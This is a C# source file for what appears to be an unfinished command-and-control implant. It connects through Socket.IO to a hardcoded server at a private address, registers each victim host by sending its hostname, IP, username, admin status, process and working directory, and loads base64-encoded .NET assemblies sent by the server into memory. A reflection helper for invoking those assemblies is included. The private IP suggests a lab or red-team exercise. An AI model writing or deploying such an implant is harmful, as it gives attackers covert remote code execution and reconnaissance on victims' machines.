using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SocketIOClient;
using System.Net;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    
    public class Program
    {
        public static void Main(string[] args)
        {
            if (args.Length > 1)
            {
                Go(args[0]);
            }
            else
            {
                Go();
            }
            while (true) { };
        }
        static async void Go(string home = "http://172.16.113.1:3000/client")
        {
            // create new socket.io client
            var client = new SocketIO(home);

            // Create the agent id
            string id = Guid.NewGuid().ToString();

            // register all of the commands
            // Client echo
            client.On("echo", response =>
            {
                Console.WriteLine(response.ToString());
                client.EmitAsync("echo", response.ToString());
            });

            // Client load .NET assembly (dll) // TODO: Wire this into the server
            client.On("load", response =>
            {
                try
                {
                    Assembly assembly = Assembly.Load(Convert.FromBase64String(response.GetValue<string>()));
                    client.EmitAsync("echo", "Loaded " + assembly.FullName);
                }
                catch (Exception e)
                {
                    client.EmitAsync("echo", "Load failed!\n\n" + e.Message);
                }
            });

            // Client invoke loaded assembly (.NET DLL) // TODO: Wire this into the server, send output
            client.On("run", response =>
            {
                string[] args = response.GetValue<string[]>();
                Console.WriteLine("Debg: args: ");
                foreach (string arg in args)
                {
                    Console.WriteLine(arg);
                }
                //(object obj, string output) = Invoke(args);
            });

            // add an event that happens when we first connect
            client.OnConnected += (sender, e) =>
            {
                client.EmitAsync("register", GetSysinfo(id));
            };

            // finally, connect to the server and start the party
            await client.ConnectAsync();
        }
        static (object, string) Invoke(string assemblyName, string[] args, string methodName = "Run")
        {
            Assembly GetAssemblyByName(string name)
            {
                return AppDomain.CurrentDomain.GetAssemblies().
                       SingleOrDefault(_ => _.GetName().Name == name);
            }

            Assembly assembly = GetAssemblyByName(assemblyName);
            Console.WriteLine("Debug: " + assembly.FullName);
            Type[] types = assembly.GetExportedTypes();
            object methodOutput;
            foreach (Type type in types)
            {
                foreach (MethodInfo method in type.GetMethods())
                {
                    if (method.Name == methodName)
                    {
                        //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
                        TextWriter prevConOut = Console.Out;
                        var sw = new StringWriter();
                        Console.SetOut(sw);

                        object instance = Activator.CreateInstance(type);
                        if (args.Length == 0)
                        {
                            methodOutput = method.Invoke(instance, new object[] { new string[0] }); // empty arguments
                        }
                        else
                        {
                            methodOutput = method.Invoke(instance, new object[] { args });
                        }

                        //Restore output -- Stops redirecting output
                        Console.SetOut(prevConOut);
                        string strOutput = sw.ToString();

                        return (methodOutput, strOutput);
                    }
                }

            }
            return (null, null); // No methodOutput or string output
        }
        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());

            var ip = host.AddressList.FirstOrDefault(_ip => _ip.AddressFamily == AddressFamily.InterNetwork);

            return ip != null ? ip.ToString() : "0.0.0.0";
        }
        private static bool AmIHigh()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static object GetSysinfo(string id)
        {
            string hostname = Environment.MachineName;
            string ipaddr = GetLocalIPAddress();
            string elevated = AmIHigh() ? "*" : "";
            string username = elevated + WindowsIdentity.GetCurrent().Name;
            string pid = Process.GetCurrentProcess().Id.ToString();
            string process = Process.GetCurrentProcess().MainModule.FileName;
            string pwd = Directory.GetCurrentDirectory();

            return new { id, hostname, ipaddr, username, pid, process, pwd };
        }
    }
}